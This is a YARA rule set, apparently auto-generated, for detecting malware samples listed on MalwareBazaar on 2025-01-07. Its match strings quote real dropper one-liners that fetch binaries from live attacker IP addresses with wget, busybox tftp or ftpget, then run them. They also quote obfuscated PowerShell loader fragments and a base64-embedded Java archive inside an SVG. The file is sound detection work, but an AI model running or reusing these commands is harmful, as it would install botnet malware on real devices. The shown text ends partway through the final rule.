/*
   YARA Rule Set
   Author: Sameer P Sheik IBM
   Date: 2025-01-07
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_00cae2bf4d705018eaae458331caf0afbc13bd3ca6949b1bd039b8d8f5e62ac9 {
   meta:
      description = "evidences - file 00cae2bf4d705018eaae458331caf0afbc13bd3ca6949b1bd039b8d8f5e62ac9.sh"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "00cae2bf4d705018eaae458331caf0afbc13bd3ca6949b1bd039b8d8f5e62ac9"
   strings:
      $s1 = "wget http://79.124.60.186/bins/res.arm; chmod 777 res.arm; ./res.arm test" fullword ascii
      $s2 = "wget http://79.124.60.186/bins/res.arm7; chmod 777 res.arm; ./res.arm7 test " fullword ascii
      $s3 = "wget http://79.124.60.186/bins/res.sh4; chmod 777 res.sh4; ./res.sh4 test" fullword ascii
      $s4 = "wget http://79.124.60.186/bins/res.arm6; chmod 777 res.arm6; ./res.arm6 test" fullword ascii
      $s5 = "wget http://79.124.60.186/bins/res.mpsl; chmod 777 res.mpsl; ./res.mpsl test" fullword ascii
      $s6 = "wget http://79.124.60.186/bins/res.arm5; chmod 777 res.arm5; ./res.arm5 test" fullword ascii
      $s7 = "wget http://79.124.60.186/bins/res.x86; chmod 777 res.x86; ./res.x86 test" fullword ascii
      $s8 = "wget http://79.124.60.186/bins/res.mips; chmod 777 res.mips; ./res.mips test " fullword ascii
      $s9 = "wget http://79.124.60.186/bins/res.ppc;  chmod 777 res.ppc; ./res.ppc test" fullword ascii
      $s10 = "#!/bin/bash" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      all of them
}

rule sig_0436ee42d78f2762fe6b7e5fbec7e6ecfc87784a4bf9355bda5da4dc55227438 {
   meta:
      description = "evidences - file 0436ee42d78f2762fe6b7e5fbec7e6ecfc87784a4bf9355bda5da4dc55227438.sh"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "0436ee42d78f2762fe6b7e5fbec7e6ecfc87784a4bf9355bda5da4dc55227438"
   strings:
      $s1 = "cd /tmp; rm -rf mpsl; wget http://185.142.53.43/mpsl; chmod +x mips; ./mpsl 4gt" fullword ascii
      $s2 = "cd /tmp; rm -rf mips; wget http://185.142.53.43/mips; chmod +x mips; ./mips 4gt" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_055ae8c6f2e38d98234dad7d010042e21abc96f7b86caa0f2de47a40e69e6d21 {
   meta:
      description = "evidences - file 055ae8c6f2e38d98234dad7d010042e21abc96f7b86caa0f2de47a40e69e6d21.ps1"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "055ae8c6f2e38d98234dad7d010042e21abc96f7b86caa0f2de47a40e69e6d21"
   strings:
      $s1 = "q3flOidrxXhIqLfPu7XcMUPhgK3ATsGyudK05suzWEYEWKc6sat3WZutYIAyZymQLkMni/sheO2jhvFbzRQYiM2iRcobCYHXDkywqIwFCiUmVJScDUK/Id7ir2TmOWlZ" ascii
      $s2 = "[System.Text.Encoding]::ascii.((-join (@((2424-2353),(678518/6718),(189080/1630),(596106/(4474386/623)),(5761-5645),(2341-2227)," ascii
      $s3 = "68000000680000006100000066000000680000006700000064000000670000006200000068000000600000006700000062000000680000006100000068000000" ascii /* hex encoded string 'hhafhgdgbh`gbhah' */
      $s4 = "67000000610000006700000063000000660000006800000068000000680000006700000068000000620000006800000060000000660000006800000068000000" ascii /* hex encoded string 'gagcfhhhghbh`fhh' */
      $s5 = "$scoubdmvgfnqay=$executioncontext;$eralinenanoredreedatintionerinar = -join (0..54 | ForEach-Object {[char]([int]\"0000006500000" ascii
      $s6 = "64000000690000006200000068000000660000006800000067000000670000006200000068000000600000006100000067000000640000006800000066000000" ascii /* hex encoded string 'dibhfhggbh`agdhf' */
      $s7 = "155)) -join ''))($pgk5mi8of6lh21s, ([IO.Compression.CompressionMode]::Decompress))" fullword ascii
      $s8 = "lwEYHAOJQ04Zg4WS8vJCPEXUhUxZKQRAyjqX1oKIlI2NcTSDiK4HbIN2IVFqcsiJXAN3VeY/N4kK1GXUoCUiwh9KH6klrIWpWDPjTzu9NtHBBx5RhS+s1hgqqOS4MCeF" ascii
      $s9 = "4FlyRSTAZWsDm+sOlfD/QfZ5B0jxbISqd086OO9HPz88Q//G7xvBDXF0p/0klRdDmw6/KDoIEKqXRki3XjBtZY4RnzwR7W+4wsAh3zi2TloBhCkEywKpFKZBaqcn40t+" ascii
      $s10 = "AY8rqYzFPpVUVuaG8jdVjwU/ItprylJIF2hkftvTr1tMpGBmJPDmYm1kaVTMIeM2ZLjMX4DanNsf6j2qvjUyYohfrKhHptEJw4RTZY0Y3LKFJTTdho56fH5onhG1jhKZ" ascii
      $s11 = "]::Pow(2, 1 + 2))), ([math]::Pow(2, 1 + 2))) - 14)})).(([ChaR[]]@((649011/(87195999/(70607678/7402))),(-9432+9533),(-4723+(8073-" ascii
      $s12 = "670000006700000066000000680000006200000068\".Substring(($_ * ([math]::Pow(2, 1 + 2))), ([math]::Pow(2, 1 + 2))) - 12)});$attionb" ascii
      $s13 = "ng(($_ * ([math]::Pow(2, 1 + 2))), ([math]::Pow(2, 1 + 2))) - 32)}))(($_ * (-7548+(33340800/4416))), (-6409+6411)))});[Ref].(-jo" ascii
      $s14 = "De3Du4C7oInEWMsf1FAkg1fZ3h/So3JKIfPQwPVYxo/ZmnP1y7WzfeQr1MRxEh/3tMxQH9r2r/YrYUKu8qnNzVqxaaDwdxvxEHq4dorXNXL2JYxhW9apEa82mB9eNDQL" ascii
      $s15 = "OWFlZ2ZxetP5GxgpbhPjWCH1hLWiEAFS6wiQ3jlZcn/S67qS1WO8aCcVYncnI2EQZwXvswMYhYFeH+ors/UgLv2t+D7zQ6pI98gfSDNAdWlexIg6R13YHxwNgJvZ10hp" ascii
      $s16 = "6d0losYR+izRAI39ttLkZsFL1pyuW48/ek3kxOpSXBriFb3/qYmIFFZ05mmeraJA17gxFtV6WFrG9jab9lcIZ0DeRrRUhClZgSPoe15Z2MW1GM2q4lAJlJ4RPlM6g1XD" ascii
      $s17 = "X0v/YbqsHffI6h+/ARSZ3Fhe83p7WjqoGxzVZ90cD+jEIQ+9fTHLrvXRksB4tLn/6m56W93NphptXiiIBF8fkICIkaWJ+5AufH/yybThDxEURsDk44Yd/SvbEs4079C1" ascii
      $s18 = "9ecME86Mq3azwNR4VKVhforya04DXKV3X77UiHqBs4+3hyHvxIKEspebq2ltr4jQ4B56eDgbXGPV8TfeOwSolCyd6sUvAE8S0ozAxfwTSGi6jKRzGloDOj/4YwfAzC5y" ascii
      $s19 = "PHavraerUQbO0fyz1Bk+xEw9qm3+smM1YKzeWhnAEur7FOkVh+7Qk0tWdneDwQwttChJ8Jai037PhFGKQ5ZmouWPLJ5aM/mTcPhTjdRUwhZYUL1WkSlK4guQgOyfWMUs" ascii
      $s20 = "Ztct4kIh7FpUi9FcDoiUJ6JjRdoFWE83D92ZWEDr619aJnnjUW0sQgLGBl4atd5dj+MAAiLOEF+reBATOdPDpWFx6PuI/eNX3sjzsQqwzdcGPvhQ2FUIXc8jWy33lfxF" ascii
   condition:
      uint16(0) == 0x7324 and filesize < 60KB and
      8 of them
}

rule f0802f6ec8278c7b05dcfcc763107f37f4e78c24d87d881f9fa36dfe6918a36e {
   meta:
      description = "evidences - file f0802f6ec8278c7b05dcfcc763107f37f4e78c24d87d881f9fa36dfe6918a36e.ps1"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "f0802f6ec8278c7b05dcfcc763107f37f4e78c24d87d881f9fa36dfe6918a36e"
   strings:
      $s1 = "[System.Text.Encoding]::ascii.(([char[]]@((119777/1687),(148672/(1389+83)),(98252/847),(4733-(8476-3826)),(-4799+(2408350/(11230" ascii
      $s2 = "$fvhtpujqnrdsi=$executioncontext;$eresonrereeredalaninalaten = -join (0..54 | ForEach-Object {[char]([int]\"00000127000001260000" ascii
      $s3 = "2XujI+msewQ7DqjaypQLhLfeWmHZGVcwRLMX02xDesKey8QseM4XLNnohJWdAhF4FsGnfQZQn+fC8Z+GvakvSF4RXHEUmve38tt4qYjJAJK7CtyJEQjh+hLMJ8aHc3rx" ascii
      $s4 = "12900000128000001300000012400000130\".Substring(($_ * ([math]::Pow(2, 2 + 1))), ([math]::Pow(2, 2 + 1))) - 74)});$esaledreesoror" ascii
      $s5 = "0000170000001850000013900000174000001700000017700000169\".Substring(($_ * ([math]::Pow(2, 2 + 1))), ([math]::Pow(2, 2 + 1))) - 6" ascii
      $s6 = "+9428),(930090/8858),(-2142+(-5444+7696)),(1038549/10083)) -join ''))(($_ * (5245-5243)), (-4248+(1542+2708))))});[Ref].((-jOIn " ascii
      $s7 = "UQo7M5hMX2dJgO9fB92kEVS8Y6JpMsMqj/QfVoucavHqWykdt9Jv+GlSGEryCtbELq9BL2ssDBjCp0C4NwXO58h9kFudEhZ2urhLnuyqaCN79qDg4C6qH2no6UyPD1Gd" ascii
      $s8 = "002110209020002050198\".Substring(($_ * ([math]::Pow(2, 1 + 1))), ([math]::Pow(2, 1 + 1))) - 95)}))(($_ * (-5214+5216)), (647-(-" ascii
      $s9 = "gbpzqYX6/VCyNW+UpJ4yvNSseM5CFx7XRH4Ghzwx1xddDH9dr9iTUk0QioPshsw0Y0QTUYt88Gw5/W7+1M24/wMfD6NbVJt9HRjXk6ZXEnJG7cngr9BODcjPnayJsE01" ascii
      $s10 = "9rmTKxOd6iVG55YH9cnDAkIYke3rB+eFKg2fir5a7abYJQEWnUWZwtc9XjUYWzeXSXossmRuOQLhNyft+2Dr1wD/ITm7GXr1tvyCjQXcVSBmvO4/Be0AXDGcTPjR12is" ascii
      $s11 = "iwy6MT7pt+D3U0Jg2/bW8WdBXVoLGdETWjgQ5V8l+CtcCmQnQxLeTqBgRksYsnBtXTx8ZDL9pjgOZkKpge43+uHzl4alW1eRUX8Sti+wXlTh5W2/COwWYHu2wYPtI3a1" ascii
      $s12 = "2cKBhNXMvAsRl+WnzN+QuLsaJ9EW0WcIYCv39zKc9EsKeL/PWZE8vq6R9ya6B6JyMrxWGEekVYI3Cgg7Y4R/2H/v6TrcH3vdg7FtzLqhlA3vGeX3E/UPfIoAkvUQ6cDQ" ascii
      $s13 = "LlCpyI/KHZKKEcWl1+sw+LsaB1GQvPvBirHhyc3UvnKV2+sCmqOyXIzfoB+cuShH96XskfhR6/YIRaP6QyhVVT0ZLVF37Csk2n+mA4L/M8OCko44PL2lsoNlGwjDP5+6" ascii
      $s14 = "k9IvKBY2hW1jRjsy0gpnqT6ZeD0O89nYqGhEHfT06eIQxyalNRWw5gkLtgE20pnVVaxrZUFns0cNOjiC7jETc4RqYZrKRZMWYS93LTGfYtTLibpqOwks4rBZtMloWBJq" ascii
      $s15 = "+7R++HoT2Adz1QImIlNc3a4xyUzi4gHoijJFITvvXZK/CYdCmhoOR6AKSytrIuSkZJH4n39seXsFEeY8/W/sRHQOR5tz84qHHX+kPRmXVeDjtnNLUbRp/vjwt1drQu/V" ascii
      $s16 = "zSPQuKqKw7E1H0kXTZXdktr7j+shvu+QwZ7avP/Iyla1PGjyrVHNhu9atpvF1EmyXy9DWdNQQqo8kWIyH9fqaIJGiUQmQtKuBs2xDg/OrYaupG3jmEAJUgr9dt4Bys0L" ascii
      $s17 = "PIVcqx6c/vzEBx68pGe7flksF3DFz5mRlTVS2flgsnsv/xtp5UBF2budHUS/TXdGaOBJPl7xU+mkZUC7HijRZs1JmR3bV7SkTXZSbqD5VTBpCCjbNKvNtAefBkzpXtBZ" ascii
      $s18 = "FrgNXuR+Zvff7U/S+i0SI8WWdMATVqwrn/PbXd2wd39abeyb+xdCTBm68vXfOeHfF+G2U/blTVAhZlRURHDp21GQYipnapzztxgu2Dt1lskp7FVKslMEreO1IKsHJYr2" ascii
      $s19 = "bYciqVMbeErdWrFSE6twN0kalQKvy/tPW6SKO84570mmDdje/qwbFdhx1ri8dqrnOIbwbseH/zXjQ7kKeoC+zJV7bTd63viKvY0MHrj/kG1pJwl6J0m2g8RoLu+Rwi5m" ascii
      $s20 = "8sZMaj8XPs8DnwphbJiJ4B49OkNAMgae9gBHafnMbezv93GamcEVghI1f6fpA76RIgdARxMVFCk+O7u0gN4D8opeM1C+znhGTvdezZLD8AEktWaGeEFGFX0xd3bpDncJ" ascii
   condition:
      uint16(0) == 0x6624 and filesize < 60KB and
      8 of them
}

rule sig_199a1859cdc2f8a1ad5d12821d18febb6e4c7dd26ed4c9c3eb5548e3052c62ec {
   meta:
      description = "evidences - file 199a1859cdc2f8a1ad5d12821d18febb6e4c7dd26ed4c9c3eb5548e3052c62ec.svg"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "199a1859cdc2f8a1ad5d12821d18febb6e4c7dd26ed4c9c3eb5548e3052c62ec"
   strings:
      $x1 = "        const base64Data = 'data:application/java-archive;base64,UEsDBAoAAAAAAKejJVoAAAAAAAAAAAAAAAATAAAAU3dpZnQgVHJhbnNhY3Rpb25" ascii
      $s2 = "    <!-- Main Content -->" fullword ascii
      $s3 = "oUEsgBlCngpXfGWr0KWwn0CPpI1xauZoPiKqvUKwBiYCwNfTphHZ+A0kIOsDBiNA7XTAUgCcOfBFXt5EwvDyZ0msIANpSjJ+Gp6ekx912OI1C5mWJlyPN5Docv69Hcge" ascii
      $s4 = "    <!-- Header Text -->" fullword ascii
      $s5 = "    <!-- Header -->" fullword ascii
      $s6 = "    <!-- Logo -->" fullword ascii
      $s7 = "/3l+jmn/++fP+D3h2MVTYw4v/jT21FrOHl2Ptz//2j//+9x82A/bh9yd0+HQisk8r7OMy/Gf0/q/0zz8rf/tpSdQ0/t3sA2Icw1enilFh/9KSPyt//62KaebfKqmh9P7" ascii
      $s8 = "sFos9DPbgEYGet04niDKrZIdajWIPSTvp9SR3t6TRIc7LHj6qQMGQ7WCLysUNI2zlPnhnP5TmFOkSn36N54mKxH0jSO9IrzC5MxannDJmNwIo4pfcknIjhiqrbTud7dD" ascii
      $s9 = "IZFciiRCx9Y5xGBdgLx1EaPUV8lIFAS8KDTzQG4txSq+KIvHrBrl57HDxuukkTjISdN1IpNEu/qKYBEUpDs8N4qRVYi4JbKFH2N6L2GbFeOPGEo6sdLRLdZI5ShhlkQR" ascii
      $s10 = "9Kvg1cpDWu2YFxL2EuOjXEcTjXCBZmt8Nb/wJh32+UKa1AlKQoCQqDj2DAomMdO1UMbPcgnSPYGW5rdcP1fDifYsrjh8N+B6DpCmSLgJsQXxXwvOMWNN0qGzPQ/yLxev" ascii
      $s11 = "hj9FikVT/WT5dgO4BfTpd55CYm77+8qvSlNuDv/uoksK2dsnUpxhCgUPWPYUhxy46rmLpXTrCHw264yS916SMGA2qFViY+qEdlaQZI0QqPpgRY3rbVIVvc/wii/HzuJg" ascii
      $s12 = "iN1u1EV36zLf+mwa/IkiEfTprzW1UipgN3xLadIWmNWAgW0dDq7dhY1R8FHo50PzIOo0tytSZehUW1VRIu9Bu6ix8Iy2i7kY5JB9/nob+Vn/ky3X/v/8havMdUXx2HX8" ascii
      $s13 = "wp2OO6u8UYeYD1ZR4EJy4OMpzeJr+irKNKWfRg4hY0WW8ZFLZGWPTAFTPuwkHwC5iLMTFQsb6vlMkER1ggqdFwBGGtsq0s3PEY3lR3Lvii988hF1DBCLnG5ua91NM/RQ" ascii
      $s14 = "c/JQI954ApMv0N09g5Dpq/EQqPRBHiXVdCQBRF7UuvnageTWtLbSTgjC+ITdY28htRzlBMO38dGioDBUuAJu0Y/3H4V15NYYMKuqghio6TUywEVjwhsCeW9Oz57QTGWj" ascii
      $s15 = "+BvKunlQH4vspZOQXb/2OA2oWGDPgtRZAiRCdM3hlN3w4xx2Gt8OCQgSVP7Jevkl/cL1I2OzICmwSxUKT4/ZljKOxAkIHRe9whsafQeWZqmOOUfRE8G2QMdDaN237g+t" ascii
      $s16 = "VKLSbcrniutOmJrqkfPfxCLZKtYjkoEn+ZtTts+KuyR3dHy3q9Itmsz//6VRoJbEo6Goattm6mtEyevuWm6twTzfy/PNJT9LYxlsvDLdoRuFDFm3VTHGKUbtQuKm4B5N" ascii
      $s17 = "BE/IjbkRP6oK37Iiwz9B7du0IrcUbMTzp3cdC5FVTGqSNihYAnQ8uZQE7QfcErbvfNU4rNVof8VItMy1P0/XzBtYa2jCF5o7bjrGlARagzzZQZwuBsx1s38LfIG6lZAj" ascii
      $s18 = "pnv6foI+AwF4K8dcpDhkNjGmJuka2PI4H33uVQPD4y0MceKoxeksR/gsd+yBNxC82JIiFTPBKFadNAQ4v3g6dBDI4LBYVYovxpiJFRynC6AnGiMRUJKE0xkHw3UoEsw3" ascii
      $s19 = "wgFzHhNbCWg7jLJ4VpTn9yvz63cy2v38169U/eDU5h681vZ8nTmzvOqmxDHHfrI8mN6X8xgDMQ1LY35/Ons7XJri9IRctwmuP54pv/+oeVdmgLD+pGtLC96cBGIthW0E" ascii
      $s20 = "kooNe5I3njSPTIPnQMoF3uSmTpbjCVwnNPhxvCwwQF7a4wEm1jqWiL7xVNLoZnMkBeC3M8EAvJzeZcRKVk2jh5YRgrT2gh6otykSnxvO9yuNHOhYDDc10pIUY0JWuCbu" ascii
   condition:
      uint16(0) == 0x733c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219 {
   meta:
      description = "evidences - file 0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{4CBD9F7D-7522-4692-9696-B51CF758FAA5}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "6\\\"\"a`" fullword ascii /* hex encoded string 'j' */
      $s4 = "4SAf.phI),_Ut" fullword ascii
      $s5 = "VJdftP" fullword ascii
      $s6 = "YdlLr," fullword ascii
      $s7 = "WBBpBc9" fullword ascii
      $s8 = "BG- n]" fullword ascii
      $s9 = "23\\(~Q!." fullword ascii
      $s10 = "fjvtxp" fullword ascii
      $s11 = "!BF4* U" fullword ascii
      $s12 = "e`z4!." fullword ascii
      $s13 = "-?k'$)- b3" fullword ascii
      $s14 = "fG /L0" fullword ascii
      $s15 = " /m=w`26" fullword ascii
      $s16 = " /s}p_" fullword ascii
      $s17 = "alzkkm" fullword ascii
      $s18 = "U+ >3B={" fullword ascii
      $s19 = "k- YlW" fullword ascii
      $s20 = "y -EX?U[" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_1705a7c373b5e0b1b21ef3b3dacdbc8779343d7ee762e3ae5e16ba7c3f768089 {
   meta:
      description = "evidences - file 1705a7c373b5e0b1b21ef3b3dacdbc8779343d7ee762e3ae5e16ba7c3f768089.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "1705a7c373b5e0b1b21ef3b3dacdbc8779343d7ee762e3ae5e16ba7c3f768089"
   strings:
      $s1 = "panF3Qkgw" fullword ascii /* base64 encoded string 'jqwBH0' */
      $s2 = "JjhCMVVQA" fullword ascii /* base64 encoded string '&8B1UP' */
      $s3 = "alspen1n/" fullword ascii /* base64 encoded string 'j[)z}g' */
      $s4 = "Tempjary?" fullword ascii
      $s5 = "SV56Lmc8w" fullword ascii /* base64 encoded string 'I^z.g<' */
      $s6 = "ecuu.reu&`" fullword ascii
      $s7 = "EKDy:\"" fullword ascii
      $s8 = "* % A@" fullword ascii
      $s9 = "%,6@/_8$`" fullword ascii /* hex encoded string 'h' */
      $s10 = "OEOFEndErrFPEFebFriGETGetH" fullword ascii
      $s11 = "* 1wX!" fullword ascii
      $s12 = "Jd@finfmaftpgso" fullword ascii
      $s13 = "9execB" fullword ascii
      $s14 = "* Sp4B" fullword ascii
      $s15 = "pZY- -0" fullword ascii
      $s16 = "IRCvAoP0h" fullword ascii
      $s17 = "7:$668,,/" fullword ascii /* hex encoded string 'vh' */
      $s18 = "* <JD1y/D" fullword ascii
      $s19 = "CoCsF=IDLlLmLoLtLuMcMeMnNdNlNoOK" fullword ascii
      $s20 = "3 chan<- KrDcZ04r" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 13000KB and
      8 of them
}

rule sig_8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663868f6f {
   meta:
      description = "evidences - file 8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663868f6f.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663868f6f"
   strings:
      $s1 = "/wget.sh -O- | sh;/bin/busybox tftp -g " fullword ascii
      $s2 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " fullword ascii
      $s3 = "tluafed" fullword ascii /* reversed goodware string 'default' */
      $s4 = "User-Agent: Wget" fullword ascii
      $s5 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */
      $s6 = "/bin/busybox wget http://" fullword ascii
      $s7 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" fullword ascii
      $s8 = "L21udC9tdGQvYXBw" fullword ascii /* base64 encoded string '/mnt/mtd/app' */
      $s9 = "L3Vzci9saWJleGVjLwAA" fullword ascii /* base64 encoded string '/usr/libexec/  ' */
      $s10 = "L2hvbWUvZGF2aW5jaQAA" fullword ascii /* base64 encoded string '/home/davinci  ' */
      $s11 = "L3Vzci9saWIA" fullword ascii /* base64 encoded string '/usr/lib ' */
      $s12 = "L2hvbWUvaGVscGVy" fullword ascii /* base64 encoded string '/home/helper' */
      $s13 = "d3d3Lm9ubHlkYW5jZS5jYW0A" fullword ascii /* base64 encoded string 'www.onlydance.cam ' */
      $s14 = "L3Vzci9ldGMA" fullword ascii /* base64 encoded string '/usr/etc ' */
      $s15 = "L2hvbWUvcHJvY2VzcwAA" fullword ascii /* base64 encoded string '/home/process  ' */
      $s16 = "L3Vzci9zYmlu" fullword ascii /* base64 encoded string '/usr/sbin' */
      $s17 = "L3Zhci9Tb2ZpYQAA" fullword ascii /* base64 encoded string '/var/Sofia  ' */
      $s18 = "ZGViLm9ubHlkYW5jZS5jYW0A" fullword ascii /* base64 encoded string 'deb.onlydance.cam ' */
      $s19 = "L3Vzci9iaW4A" fullword ascii /* base64 encoded string '/usr/bin ' */
      $s20 = "L3ovemJpbgAA" fullword ascii /* base64 encoded string '/z/zbin  ' */
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule a7e6c20d68c9846d9f17a511bcbbda10d808e2169dc521599ce2cb962ac9579e {
   meta:
      description = "evidences - file a7e6c20d68c9846d9f17a511bcbbda10d808e2169dc521599ce2cb962ac9579e.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "a7e6c20d68c9846d9f17a511bcbbda10d808e2169dc521599ce2cb962ac9579e"
   strings:
      $s1 = "/wget.sh -O- | sh;/bin/busybox tftp -g " fullword ascii
      $s2 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " fullword ascii
      $s3 = "tluafed" fullword ascii /* reversed goodware string 'default' */
      $s4 = "User-Agent: Wget" fullword ascii
      $s5 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */
      $s6 = "/bin/busybox wget http://" fullword ascii
      $s7 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" fullword ascii
      $s8 = "L21udC9tdGQvYXBw" fullword ascii /* base64 encoded string '/mnt/mtd/app' */
      $s9 = "L3Vzci9saWJleGVjLwAA" fullword ascii /* base64 encoded string '/usr/libexec/  ' */
      $s10 = "L2hvbWUvZGF2aW5jaQAA" fullword ascii /* base64 encoded string '/home/davinci  ' */
      $s11 = "L3Vzci9saWIA" fullword ascii /* base64 encoded string '/usr/lib ' */
      $s12 = "L2hvbWUvaGVscGVy" fullword ascii /* base64 encoded string '/home/helper' */
      $s13 = "d3d3Lm9ubHlkYW5jZS5jYW0A" fullword ascii /* base64 encoded string 'www.onlydance.cam ' */
      $s14 = "L3Vzci9ldGMA" fullword ascii /* base64 encoded string '/usr/etc ' */
      $s15 = "L2hvbWUvcHJvY2VzcwAA" fullword ascii /* base64 encoded string '/home/process  ' */
      $s16 = "L3Vzci9zYmlu" fullword ascii /* base64 encoded string '/usr/sbin' */
      $s17 = "L3Zhci9Tb2ZpYQAA" fullword ascii /* base64 encoded string '/var/Sofia  ' */
      $s18 = "ZGViLm9ubHlkYW5jZS5jYW0A" fullword ascii /* base64 encoded string 'deb.onlydance.cam ' */
      $s19 = "L3Vzci9iaW4A" fullword ascii /* base64 encoded string '/usr/bin ' */
      $s20 = "L3ovemJpbgAA" fullword ascii /* base64 encoded string '/z/zbin  ' */
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule b01388431330e30201aa326c75da6715aed4934ed3b7fb1221683aa0bb8eab09 {
   meta:
      description = "evidences - file b01388431330e30201aa326c75da6715aed4934ed3b7fb1221683aa0bb8eab09.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "b01388431330e30201aa326c75da6715aed4934ed3b7fb1221683aa0bb8eab09"
   strings:
      $s1 = "/wget.sh -O- | sh;/bin/busybox tftp -g " fullword ascii
      $s2 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " fullword ascii
      $s3 = "tluafed" fullword ascii /* reversed goodware string 'default' */
      $s4 = "User-Agent: Wget" fullword ascii
      $s5 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */
      $s6 = "/bin/busybox wget http://" fullword ascii
      $s7 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" fullword ascii
      $s8 = "L21udC9tdGQvYXBw" fullword ascii /* base64 encoded string '/mnt/mtd/app' */
      $s9 = "L3Vzci9saWJleGVjLwAA" fullword ascii /* base64 encoded string '/usr/libexec/  ' */
      $s10 = "L2hvbWUvZGF2aW5jaQAA" fullword ascii /* base64 encoded string '/home/davinci  ' */
      $s11 = "L3Vzci9saWIA" fullword ascii /* base64 encoded string '/usr/lib ' */
      $s12 = "L2hvbWUvaGVscGVy" fullword ascii /* base64 encoded string '/home/helper' */
      $s13 = "d3d3Lm9ubHlkYW5jZS5jYW0A" fullword ascii /* base64 encoded string 'www.onlydance.cam ' */
      $s14 = "L3Vzci9ldGMA" fullword ascii /* base64 encoded string '/usr/etc ' */
      $s15 = "L2hvbWUvcHJvY2VzcwAA" fullword ascii /* base64 encoded string '/home/process  ' */
      $s16 = "L3Vzci9zYmlu" fullword ascii /* base64 encoded string '/usr/sbin' */
      $s17 = "L3Zhci9Tb2ZpYQAA" fullword ascii /* base64 encoded string '/var/Sofia  ' */
      $s18 = "ZGViLm9ubHlkYW5jZS5jYW0A" fullword ascii /* base64 encoded string 'deb.onlydance.cam ' */
      $s19 = "L3Vzci9iaW4A" fullword ascii /* base64 encoded string '/usr/bin ' */
      $s20 = "L3ovemJpbgAA" fullword ascii /* base64 encoded string '/z/zbin  ' */
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_4ffeabdf99c65169b3fda5c7cc2afdd0d78e1a0817d99892a201bb642f883137 {
   meta:
      description = "evidences - file 4ffeabdf99c65169b3fda5c7cc2afdd0d78e1a0817d99892a201bb642f883137.unknown"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "4ffeabdf99c65169b3fda5c7cc2afdd0d78e1a0817d99892a201bb642f883137"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s3 = "AAAAAAAAAAAA4" ascii /* base64 encoded string '         ' */
      $s4 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s5 = "AAAAAAAAAE" ascii /* base64 encoded string '       ' */
      $s6 = "AABAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '  @                   ' */
      $s7 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */
      $s8 = "AAAAAAAAAAAAAAABAAAAA" ascii /* base64 encoded string '           @   ' */
